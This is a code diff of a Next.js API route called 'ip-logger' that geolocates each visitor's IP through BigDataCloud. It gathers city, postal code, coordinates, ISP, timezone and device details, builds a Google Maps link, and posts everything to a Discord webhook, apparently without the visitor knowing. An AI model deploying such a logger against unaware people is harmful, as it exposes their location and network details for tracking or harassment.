@@ -1,6 +1,4 @@
-// /pages/api/ip-logger.js
-// Robust IP logger with DEBUG logging to diagnose missing fields.
-
+// /pages/api/ip-logger.js - CORRECTED for actual BigDataCloud response structure
 export default async function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -21,194 +19,348 @@ export default async function handler(req, res) {
     clientIP = clientIP.replace(/^::ffff:/, '');
     const userAgent = (req.headers['user-agent'] || 'Unknown').toString();
 
-    console.log('DEBUG: Client IP:', clientIP);
-
     // --- API Key Check ---
     const KEY = process.env.BIGDATACLOUD_API_KEY;
     if (!KEY) {
-      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY environment variable.');
+      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
       return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
     }
-    console.log('DEBUG: API Key present (first 5 chars):', KEY.substring(0, 5), '...');
 
     // --- Fetch from BigDataCloud ---
     const BASE = 'https://api-bdc.net/data';
     const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
-    console.log('DEBUG: Fetching from URL:', GEO_URL);
-
+    
     let ipData = {};
-    let rawResponseText = '';
     try {
       const response = await fetch(GEO_URL);
-      const status = response.status;
-      rawResponseText = await response.text(); // Get raw text first
-
-      // ===== CRITICAL DEBUG LOGS =====
-      console.log('DEBUG: API HTTP Status:', status);
-      console.log('DEBUG: Raw API Response (first 1500 chars):', rawResponseText.substring(0, 1500));
-      // ===============================
-
-      if (response.ok && rawResponseText) {
-        try {
-          ipData = JSON.parse(rawResponseText);
-          console.log('DEBUG: Successfully parsed JSON. Top-level keys:', Object.keys(ipData));
-        } catch (parseError) {
-          console.error('DEBUG: Failed to parse JSON:', parseError.message);
-          ipData = {};
-        }
-      } else {
-        console.warn('DEBUG: API request not OK or empty. Status:', status);
-        // If it's a 403, the key is likely invalid or quota is exceeded.
-        if (status === 403) {
-          console.error('DEBUG: BigDataCloud returned 403 Forbidden. Check API key validity and quota.');
-        }
+      if (!response.ok) {
+        console.error(`DEBUG: API error ${response.status}`);
+        return res.status(502).json({ success: false, error: `API error: ${response.status}` });
       }
+      
+      const rawText = await response.text();
+      ipData = JSON.parse(rawText);
+      console.log('DEBUG: API fetch successful');
     } catch (fetchError) {
-      console.error('DEBUG: Network fetch error:', fetchError.message);
-      ipData = {};
+      console.error('DEBUG: Fetch failed:', fetchError.message);
+      return res.status(500).json({ success: false, error: 'Failed to fetch data' });
     }
 
-    // --- Test with a known IP (Google DNS) if the initial fetch failed or returned empty ---
-    if (!ipData || Object.keys(ipData).length < 3) {
-      console.warn('DEBUG: Initial response poor. Testing with IP 8.8.8.8 for comparison.');
-      const TEST_URL = `${BASE}/ip-geolocation-full?ip=8.8.8.8&localityLanguage=en&key=${KEY}`;
-      try {
-        const testResponse = await fetch(TEST_URL);
-        if (testResponse.ok) {
-          const testText = await testResponse.text();
-          const testData = JSON.parse(testText);
-          console.log('DEBUG: Test with 8.8.8.8 succeeded. Keys:', Object.keys(testData));
-          // Optional: uncomment to see full test structure
-          // console.log('DEBUG: Test data sample:', JSON.stringify(testData).substring(0, 1000));
-        }
-      } catch (testErr) {
-        console.error('DEBUG: Test fetch also failed:', testErr.message);
-      }
-    }
-
-    // --- Helper to safely extract data (your existing logic) ---
-    const tryPaths = (...paths) => {
-      for (const p of paths) {
-        if (!p) continue;
-        const parts = p.split('.');
-        let cur = ipData;
-        let ok = true;
-        for (const part of parts) {
-          if (cur == null) { ok = false; break; }
-          cur = cur[part];
-        }
-        if (ok && cur !== undefined && cur !== null && cur !== '') {
-          console.log(`DEBUG: Found value for paths [${paths}] at "${p}":`, cur);
-          return cur;
-        }
-      }
-      console.log(`DEBUG: No value found for any path:`, paths);
-      return undefined;
-    };
-
-    // --- Extract Data Using Helper ---
-    console.log('--- DEBUG: Starting Field Extraction ---');
-
-    const lat = tryPaths('location.latitude', 'latitude');
-    const lon = tryPaths('location.longitude', 'longitude');
-    const region = tryPaths('location.principalSubdivision', 'location.region', 'principalSubdivision');
-    const city = tryPaths('location.city', 'locality', 'city');
-    const country = tryPaths('country.name', 'countryName', 'country');
-    const countryCode = tryPaths('country.isoAlpha2', 'countryCode');
-    const isp = tryPaths('network.carrier.name', 'isp', 'network.name');
-    const asnRaw = tryPaths('network.autonomousSystemNumber', 'asn');
-    const asn = asnRaw ? `AS${asnRaw}` : null;
-    const org = tryPaths('network.organisation', 'organisation');
-    const confidence = tryPaths('location.confidence', 'confidence');
-    const accuracyRadius = tryPaths('location.accuracyRadius', 'accuracyRadius');
-
-    // --- Build Final Structured Object ---
+    // --- Extract Data from CORRECT Fields ---
+    // Location data
+    const latitude = ipData?.location?.latitude || null;
+    const longitude = ipData?.location?.longitude || null;
+    const continent = ipData?.location?.continent || 'Unknown';
+    const region = ipData?.location?.principalSubdivision || 'Unknown';
+    const city = ipData?.location?.city || 'Unknown';
+    const locality = ipData?.location?.localityName || city;
+    const postalCode = ipData?.location?.postcode || '';
+    
+    // Country data
+    const country = ipData?.country?.name || 'Unknown';
+    const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
+    const callingCode = ipData?.country?.callingCode || '';
+    const currency = ipData?.country?.currency?.code || '';
+    const currencyName = ipData?.country?.currency?.name || '';
+    
+    // Network data
+    const isp = ipData?.network?.organisation || 'Unknown';
+    const asnRaw = ipData?.network?.autonomousSystemNumber;
+    const asn = asnRaw ? `AS${asnRaw}` : 'Unknown';
+    const connectionType = ipData?.network?.connectionType || 'Unknown';
+    
+    // Confidence/Accuracy data
+    const confidence = ipData?.confidence || 'unknown';
+    const confidenceArea = ipData?.confidenceArea || null;
+    const accuracyRadius = ipData?.location?.accuracyRadius || computeRadiusFromPolygon(confidenceArea);
+    
+    // Timezone
+    const timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';
+    
+    // Security
+    const securityThreat = ipData?.securityThreat || null;
+    const hazardReport = ipData?.hazardReport || null;
+    
+    // --- Generate Map URL ---
+    const mapUrl = generateMapLink(latitude, longitude, accuracyRadius);
+    
+    // --- Build Final Data Object ---
     const structuredData = {
       ip: clientIP,
       timestamp: new Date().toISOString(),
       userAgent,
       location: {
-        country: country || 'Unknown',
-        countryCode: countryCode || 'Unknown',
-        region: region || 'Unknown',
-        city: city || 'Unknown',
-        latitude: lat,
-        longitude: lon,
-        confidence: confidence || 'unknown',
-        accuracyRadius: accuracyRadius
+        continent,
+        continentCode: ipData?.location?.continentCode || '',
+        country,
+        countryCode,
+        region,
+        regionCode: ipData?.location?.isoPrincipalSubdivisionCode || '',
+        city,
+        locality,
+        postalCode,
+        latitude,
+        longitude,
+        plusCode: ipData?.location?.plusCode || '',
+        accuracyRadius,
+        confidence,
+        confidenceArea,
+        mapUrl
+      },
+      countryDetails: {
+        callingCode,
+        currency,
+        currencyName,
+        isEU: ipData?.country?.isEU || false,
+        flagEmoji: ipData?.country?.countryFlagEmoji || ''
       },
       network: {
-        isp: isp || 'Unknown',
-        organization: org || 'Unknown',
-        asn: asn || 'Unknown'
+        isp,
+        asn,
+        connectionType,
+        organisation: ipData?.network?.organisation || '',
+        carrier: ipData?.network?.carrier || {}
+      },
+      timezone: {
+        name: timezone,
+        raw: ipData?.location?.timeZone || {}
+      },
+      security: {
+        threat: securityThreat,
+        hazards: hazardReport
       },
       device: parseUserAgent(userAgent),
-      // Include raw response in development for deep inspection
-      _debug: process.env.NODE_ENV === 'development' ? {
-        apiResponseSample: rawResponseText.substring(0, 500),
-        parsedKeys: Object.keys(ipData)
-      } : undefined
+      metadata: {
+        lastUpdated: ipData?.lastUpdated || '',
+        isReachable: ipData?.isReachableGlobally || false,
+        rawKeys: Object.keys(ipData)
+      }
     };
 
-    console.log('DEBUG: Final structuredData:', JSON.stringify(structuredData, null, 2));
-
-    // --- Optional Discord Webhook (unchanged) ---
+    // --- Send to Discord ---
     if (process.env.DISCORD_WEBHOOK_URL) {
-      sendToDiscord(structuredData).catch(e => console.warn('Discord send failed:', e.message));
+      sendToDiscord(structuredData).catch(e => console.warn('Discord error:', e.message));
     }
 
-    // --- Return Response to Client ---
+    // --- Return Response ---
     return res.status(200).json({
       success: true,
-      data: structuredData
+      data: structuredData,
+      _debug: process.env.NODE_ENV === 'development' ? { rawKeys: Object.keys(ipData) } : undefined
     });
 
   } catch (err) {
-    console.error('Unhandled error in handler:', err);
+    console.error('Handler error:', err);
     return res.status(500).json({ success: false, error: 'Internal server error' });
   }
 }
 
 // --- Helper Functions ---
 
+function generateMapLink(latitude, longitude, radiusKm) {
+  if (!latitude || !longitude) return null;
+  
+  // Simple Google Maps link - works without API key
+  const zoom = radiusKm > 100 ? 8 : radiusKm > 50 ? 10 : radiusKm > 10 ? 12 : 14;
+  return `https://www.google.com/maps?q=${latitude},${longitude}&z=${zoom}`;
+  
+  // For a visual circle overlay, you'd need Google Maps API key:
+  // return `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=${zoom}&size=600x300&markers=color:red%7C${latitude},${longitude}&key=YOUR_KEY`;
+}
+
+function computeRadiusFromPolygon(confidenceArea) {
+  if (!confidenceArea || !Array.isArray(confidenceArea) || confidenceArea.length === 0) {
+    return null;
+  }
+  
+  try {
+    // Extract all points from the polygon
+    const points = confidenceArea.map(point => {
+      if (Array.isArray(point) && point.length >= 2) {
+        return { lat: point[1], lon: point[0] }; // GeoJSON format: [lon, lat]
+      }
+      return null;
+    }).filter(Boolean);
+    
+    if (points.length === 0) return null;
+    
+    // Find centroid
+    const centroid = points.reduce((acc, pt) => {
+      acc.lat += pt.lat;
+      acc.lon += pt.lon;
+      return acc;
+    }, { lat: 0, lon: 0 });
+    centroid.lat /= points.length;
+    centroid.lon /= points.length;
+    
+    // Find max distance from centroid
+    let maxDistance = 0;
+    for (const point of points) {
+      const distance = haversine(centroid.lat, centroid.lon, point.lat, point.lon);
+      if (distance > maxDistance) maxDistance = distance;
+    }
+    
+    return Math.round(maxDistance * 10) / 10; // Round to 1 decimal
+  } catch (e) {
+    console.warn('Radius computation failed:', e.message);
+    return null;
+  }
+}
+
+function haversine(lat1, lon1, lat2, lon2) {
+  const R = 6371; // Earth's radius in km
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLon = (lon2 - lon1) * Math.PI / 180;
+  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+            Math.sin(dLon/2) * Math.sin(dLon/2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  return R * c;
+}
+
 function parseUserAgent(ua) {
-    const s = (ua || '').toString();
-    let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
-    if (/OPR|Opera/.test(s)) browser = 'Opera';
-    else if (/Edg\//.test(s)) browser = 'Edge';
-    else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
-    else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
-    else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
-
-    if (/\bWindows\b/i.test(s)) os = 'Windows';
-    else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
-    else if (/\bAndroid\b/i.test(s)) os = 'Android';
-    else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
-    else if (/\bLinux\b/i.test(s)) os = 'Linux';
-
-    if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
-    else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
-    if (/bot|crawler|spider/i.test(s)) device = 'Bot';
-
-    return { browser, os, device, raw: s.substring(0, 200) };
+  const s = (ua || '').toString();
+  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
+  
+  // Browser detection
+  if (/OPR|Opera/.test(s)) browser = 'Opera';
+  else if (/Edg\//.test(s)) browser = 'Edge';
+  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
+  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
+  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
+  else if (/Trident\/.*rv:/i.test(s)) browser = 'Internet Explorer';
+  
+  // OS detection
+  if (/\bWindows NT 10\b/i.test(s)) os = 'Windows 10';
+  else if (/\bWindows NT 6.3\b/i.test(s)) os = 'Windows 8.1';
+  else if (/\bWindows NT 6.2\b/i.test(s)) os = 'Windows 8';
+  else if (/\bWindows NT 6.1\b/i.test(s)) os = 'Windows 7';
+  else if (/\bWindows NT 6\b/i.test(s)) os = 'Windows Vista';
+  else if (/\bWindows NT 5\b/i.test(s)) os = 'Windows XP';
+  else if (/\bWindows\b/i.test(s)) os = 'Windows';
+  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
+  else if (/\bAndroid\b/i.test(s)) os = 'Android';
+  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
+  else if (/\bLinux\b/i.test(s)) os = 'Linux';
+  
+  // Device detection
+  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
+  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
+  if (/bot|crawler|spider/i.test(s)) device = 'Bot';
+  
+  return { browser, os, device, raw: s.substring(0, 200) };
 }
 
 async function sendToDiscord(data) {
-    const webhook = process.env.DISCORD_WEBHOOK_URL;
-    if (!webhook) return;
-    const embed = {
-      embeds: [{
-        title: '🌐 Visitor IP Logged',
-        color: 3447003,
-        timestamp: data.timestamp,
-        fields: [
-          { name: 'IP', value: `\`${data.ip}\`` },
-          { name: 'Location', value: `${data.location.country} / ${data.location.region} / ${data.location.city}` },
-          { name: 'Accuracy', value: data.location.accuracyRadius ? `${data.location.accuracyRadius} km` : 'N/A' },
-          { name: 'Confidence', value: data.location.confidence.toUpperCase() },
-          { name: 'Network', value: `ISP: ${data.network.isp}\nASN: ${data.network.asn}` }
-        ]
-      }]
-    };
-    await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+  const webhook = process.env.DISCORD_WEBHOOK_URL;
+  if (!webhook) return;
+  
+  const embed = {
+    embeds: [{
+      title: '🌐 Visitor IP Logged',
+      color: 0x3498db,
+      timestamp: data.timestamp,
+      thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/535/535239.png' },
+      fields: [
+        { 
+          name: '📍 IP Address', 
+          value: `\`\`\`${data.ip}\`\`\``, 
+          inline: false 
+        },
+        { 
+          name: '🌍 Continent', 
+          value: data.location.continent, 
+          inline: true 
+        },
+        { 
+          name: '🇮🇳 Country', 
+          value: `${data.location.country} (${data.location.countryCode})${data.countryDetails.flagEmoji ? ' ' + data.countryDetails.flagEmoji : ''}`, 
+          inline: true 
+        },
+        { 
+          name: '🏙️ Region', 
+          value: data.location.region, 
+          inline: true 
+        },
+        { 
+          name: '🏙️ City', 
+          value: data.location.city, 
+          inline: true 
+        },
+        { 
+          name: '📍 Locality', 
+          value: data.location.locality, 
+          inline: true 
+        },
+        { 
+          name: '📡 Network Details', 
+          value: `**ISP:** ${data.network.isp}\n**ASN:** ${data.network.asn}\n**Type:** ${data.network.connectionType}`, 
+          inline: false 
+        },
+        { 
+          name: '🎯 Coordinates & Accuracy', 
+          value: `**Lat/Lon:** ${data.location.latitude}, ${data.location.longitude}\n**Accuracy:** ${data.location.accuracyRadius ? data.location.accuracyRadius + ' km' : 'N/A'}\n**Confidence:** ${data.location.confidence.toUpperCase()}`, 
+          inline: true 
+        },
+        { 
+          name: '🕒 Timezone', 
+          value: data.timezone.name, 
+          inline: true 
+        },
+        { 
+          name: '💰 Currency', 
+          value: `${data.countryDetails.currency} (${data.countryDetails.currencyName})`, 
+          inline: true 
+        },
+        { 
+          name: '📞 Calling Code', 
+          value: `+${data.countryDetails.callingCode}`, 
+          inline: true 
+        },
+        { 
+          name: '📋 Postal Code', 
+          value: data.location.postalCode || 'N/A', 
+          inline: true 
+        },
+        { 
+          name: '🖥️ Device', 
+          value: `${data.device.browser} / ${data.device.os} (${data.device.device})`, 
+          inline: true 
+        }
+      ],
+      footer: { 
+        text: `IP Logger • ${data.location.plusCode ? 'Plus Code: ' + data.location.plusCode : 'BigDataCloud'}` 
+      }
+    }]
+  };
+  
+  // Add map link if available
+  if (data.location.mapUrl) {
+    embed.embeds[0].fields.push({
+      name: '🗺️ Location Map',
+      value: `[Click to View on Google Maps](${data.location.mapUrl})`,
+      inline: false
+    });
+  }
+  
+  // Add security warning if threats exist
+  if (data.security.threat || data.security.hazards) {
+    embed.embeds[0].color = 0xff0000;
+    embed.embeds[0].fields.push({
+      name: '⚠️ Security Alert',
+      value: 'Potential security threats detected',
+      inline: false
+    });
+  }
+  
+  try {
+    await fetch(webhook, { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json' }, 
+      body: JSON.stringify(embed) 
+    });
+    console.log('Discord webhook sent successfully');
+  } catch (error) {
+    console.error('Failed to send Discord webhook:', error);
+  }
 }
